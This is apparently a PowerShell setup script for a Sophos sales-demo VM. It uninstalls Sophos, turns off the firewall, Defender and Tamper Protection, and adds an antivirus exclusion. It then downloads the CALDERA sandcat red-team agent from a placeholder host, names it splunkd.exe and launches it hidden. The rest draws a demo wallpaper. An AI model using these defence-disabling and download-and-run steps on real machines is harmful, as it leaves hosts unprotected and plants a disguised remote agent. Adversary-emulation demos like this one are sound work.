# =============================================================================
# unmanaged-endpoint — Sandcat Agent Bootstrap
# Run as Administrator in PowerShell on the unmanaged-endpoint VM
# =============================================================================

# Step 1: Uninstall Sophos if present (this VM should be unmanaged)
$sophos = Get-WmiObject -Class Win32_Product | Where-Object { $_.Name -like "Sophos*" }
if ($sophos) {
    Write-Host "[!] Sophos detected — uninstalling..." -ForegroundColor Yellow
    $sophos | ForEach-Object { $_.Uninstall() }
    Write-Host "[+] Sophos removed." -ForegroundColor Green
} else {
    Write-Host "[+] No Sophos found. Good." -ForegroundColor Green
}

# Step 2: Disable Windows Firewall
Write-Host "[*] Disabling Windows Firewall..." -ForegroundColor Cyan
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
Write-Host "[+] Firewall disabled." -ForegroundColor Green

# Step 3: Disable Tamper Protection and Windows Defender
Write-Host "[*] Disabling Tamper Protection and Windows Defender..." -ForegroundColor Cyan
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Features" `
  -Name "TamperProtection" -Value 4 -ErrorAction SilentlyContinue
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -DisableIOAVProtection $true
Set-MpPreference -DisableBehaviorMonitoring $true
Set-MpPreference -DisableScriptScanning $true
Add-MpPreference -ExclusionPath "C:\Users\Public"
Write-Host "[+] Defender disabled." -ForegroundColor Green

# Step 4: Deploy CALDERA sandcat agent
Write-Host "[*] Deploying sandcat agent..." -ForegroundColor Cyan
$server = "http://CALDERA_HOST:8888"
$url    = "$server/file/download"
$dest   = "C:\Users\Public\splunkd.exe"

$wc = New-Object System.Net.WebClient
$wc.Headers.add("platform", "windows")
$wc.Headers.add("file", "sandcat.go")
$data = $wc.DownloadData($url)

Get-Process | Where-Object { $_.modules.filename -like $dest } | Stop-Process -Force -ErrorAction Ignore
Remove-Item -Force $dest -ErrorAction Ignore
[io.file]::WriteAllBytes($dest, $data) | Out-Null

Start-Process -FilePath $dest -ArgumentList "-server $server -group red" -WindowStyle Hidden
Write-Host "[+] Sandcat deployed. Check CALDERA at $server" -ForegroundColor Green

# Step 5: Set demo wallpaper
Write-Host "[*] Setting demo wallpaper..." -ForegroundColor Cyan
try {
    Add-Type -AssemblyName System.Drawing

    # Silently skip if already added (re-runs of this script)
    try {
        Add-Type @"
using System;
using System.Runtime.InteropServices;
public class DemoWallpaper {
    [DllImport("user32.dll", CharSet = CharSet.Auto)]
    public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
}
"@
    } catch {}

    # --- Gather VM info ---
    $vmHost = $env:COMPUTERNAME
    $vmIP   = (Get-NetIPAddress -AddressFamily IPv4 |
               Where-Object { $_.IPAddress -ne '127.0.0.1' -and $_.PrefixOrigin -ne 'WellKnown' } |
               Select-Object -First 1).IPAddress
    if (-not $vmIP) { $vmIP = 'N/A' }
    $vmOS = (Get-WmiObject Win32_OperatingSystem).Caption -replace 'Microsoft ', ''

    # --- Auto-detect Sophos ---
    $sophosUp  = Get-Service -Name 'Sophos*' -ErrorAction SilentlyContinue |
                 Where-Object { $_.Status -eq 'Running' }
    $protected = ($sophosUp | Measure-Object).Count -gt 0

    # --- Canvas ---
    $W = 1920; $H = 1080
    $bmp = New-Object System.Drawing.Bitmap($W, $H)
    $g   = [System.Drawing.Graphics]::FromImage($bmp)
    $g.SmoothingMode     = [System.Drawing.Drawing2D.SmoothingMode]::AntiAlias
    $g.TextRenderingHint = [System.Drawing.Text.TextRenderingHint]::AntiAliasGridFit

    # --- Background gradient ---
    # Protected: dark navy (Sophos brand dark)
    # Unprotected: Stage Dive royal blue gradient (#2455a0 -> #0e2850)
    if ($protected) {
        $bgA = [System.Drawing.Color]::FromArgb(255,  4, 12, 35)
        $bgB = [System.Drawing.Color]::FromArgb(255,  7, 20, 52)
    } else {
        $bgA = [System.Drawing.Color]::FromArgb(255, 36, 85, 160)   # #2455a0
        $bgB = [System.Drawing.Color]::FromArgb(255, 14, 40,  80)   # #0e2850
    }
    $bgBrush = New-Object System.Drawing.Drawing2D.LinearGradientBrush(
        [System.Drawing.Point]::new(0, 0),
        [System.Drawing.Point]::new(0, $H),
        $bgA, $bgB)
    $g.FillRectangle($bgBrush, 0, 0, $W, $H)
    $bgBrush.Dispose()

    # --- Radial vignette (darker edges) ---
    $vigPath = New-Object System.Drawing.Drawing2D.GraphicsPath
    $vigPath.AddEllipse(-200, -200, $W + 400, $H + 400)
    $vigBrush = New-Object System.Drawing.Drawing2D.PathGradientBrush($vigPath)
    $vigBrush.CenterColor   = [System.Drawing.Color]::FromArgb(0, 0, 0, 0)
    $vigBrush.SurroundColors = @([System.Drawing.Color]::FromArgb(160, 0, 0, 0))
    $g.FillRectangle($vigBrush, 0, 0, $W, $H)
    $vigBrush.Dispose(); $vigPath.Dispose()

    # --- Accent color ---
    # Protected: Sophos cyan  |  Unprotected: Sophos orange (not alarming red)
    if ($protected) {
        $accent = [System.Drawing.Color]::FromArgb(255,   0, 168, 224)  # #00A8E0 Sophos cyan
    } else {
        $accent = [System.Drawing.Color]::FromArgb(255, 255, 105,   0)  # #FF6900 Sophos orange
    }
    $accentBrush = New-Object System.Drawing.SolidBrush($accent)

    # Top + bottom accent bar
    $g.FillRectangle($accentBrush, 0, 0, $W, 7)
    $g.FillRectangle($accentBrush, 0, ($H - 7), $W, 7)

    # --- Fonts ---
    $fBrand  = New-Object System.Drawing.Font('Segoe UI',  18, [System.Drawing.FontStyle]::Regular)
    $fStatus = New-Object System.Drawing.Font('Segoe UI',  76, [System.Drawing.FontStyle]::Bold)
    $fKey    = New-Object System.Drawing.Font('Segoe UI',  22, [System.Drawing.FontStyle]::Regular)
    $fVal    = New-Object System.Drawing.Font('Segoe UI',  22, [System.Drawing.FontStyle]::Bold)
    $fFooter = New-Object System.Drawing.Font('Segoe UI',  14, [System.Drawing.FontStyle]::Regular)

    # --- Brushes ---
    $whiteBrush = New-Object System.Drawing.SolidBrush([System.Drawing.Color]::FromArgb(255, 245, 245, 245))
    $dimBrush   = New-Object System.Drawing.SolidBrush([System.Drawing.Color]::FromArgb(120, 200, 200, 200))

    # --- String formats ---
    $sfCenter = New-Object System.Drawing.StringFormat
    $sfCenter.Alignment     = [System.Drawing.StringAlignment]::Center
    $sfCenter.LineAlignment = [System.Drawing.StringAlignment]::Center

    $sfLeft = New-Object System.Drawing.StringFormat
    $sfLeft.Alignment     = [System.Drawing.StringAlignment]::Near
    $sfLeft.LineAlignment = [System.Drawing.StringAlignment]::Center

    # --- Brand header (top-left) ---
    $g.DrawString('SOPHOS // STAGE DIVE — DEMO ENVIRONMENT', $fBrand, $dimBrush,
        [System.Drawing.RectangleF]::new(40, 20, 800, 40), $sfLeft)

    # --- Status badge ---
    $badgeBg = [System.Drawing.Color]::FromArgb(55,
        $accent.R, $accent.G, $accent.B)
    $badgeBrush = New-Object System.Drawing.SolidBrush($badgeBg)
    $badgeRect  = [System.Drawing.Rectangle]::new(120, 330, $W - 240, 155)
    $g.FillRectangle($badgeBrush, $badgeRect)
    $g.FillRectangle($accentBrush, 120, 330, 7, 155)   # left edge bar
    $badgeBrush.Dispose()

    $statusText = if ($protected) { 'SOPHOS PROTECTED' } else { 'UNPROTECTED ENDPOINT' }
    $g.DrawString($statusText, $fStatus, $accentBrush,
        [System.Drawing.RectangleF]::new(120, 330, $W - 240, 155), $sfCenter)

    # --- Info rows (HOST / IP / OS) ---
    $col1X = 480; $col2X = 700; $rowW = 500; $rowH = 48
    $rows  = @(
        @{ key = 'HOSTNAME'; val = $vmHost },
        @{ key = 'IP ADDRESS'; val = $vmIP },
        @{ key = 'OS'; val = $vmOS }
    )
    $startY = 570
    foreach ($i in 0..($rows.Count - 1)) {
        $y      = $startY + ($i * 60)
        $keyR   = [System.Drawing.RectangleF]::new($col1X,  $y, 200, $rowH)
        $valR   = [System.Drawing.RectangleF]::new($col2X,  $y, 600, $rowH)
        $g.DrawString($rows[$i].key, $fKey, $dimBrush,   $keyR, $sfLeft)
        $g.DrawString($rows[$i].val, $fVal, $whiteBrush, $valR, $sfLeft)
    }

    # Vertical separator between key/val
    $sepBrush = New-Object System.Drawing.SolidBrush([System.Drawing.Color]::FromArgb(60, 200, 200, 200))
    $g.FillRectangle($sepBrush, ($col2X - 20), $startY, 1, ($rows.Count * 60 - 12))
    $sepBrush.Dispose()

    # --- Footer ---
    $g.DrawString('Sophos SE Demo Platform  ·  Not for production use', $fFooter, $dimBrush,
        [System.Drawing.RectangleF]::new(0, ($H - 50), $W, 36), $sfCenter)

    # --- Save & apply ---
    $outPath = "$env:PUBLIC\demo-wallpaper.png"
    $bmp.Save($outPath, [System.Drawing.Imaging.ImageFormat]::Png)
    $g.Dispose(); $bmp.Dispose()

    # Registry: style 10 = Fill
    Set-ItemProperty -Path 'HKCU:\Control Panel\Desktop' -Name WallpaperStyle -Value '10'
    Set-ItemProperty -Path 'HKCU:\Control Panel\Desktop' -Name TileWallpaper  -Value '0'
    [DemoWallpaper]::SystemParametersInfo(20, 0, $outPath, 3) | Out-Null

    $label = if ($protected) { 'SOPHOS PROTECTED' } else { 'UNPROTECTED' }
    Write-Host "[+] Wallpaper set: $label — $vmHost / $vmIP" -ForegroundColor Green
} catch {
    Write-Host "[!] Wallpaper setup skipped: $_" -ForegroundColor Yellow
}
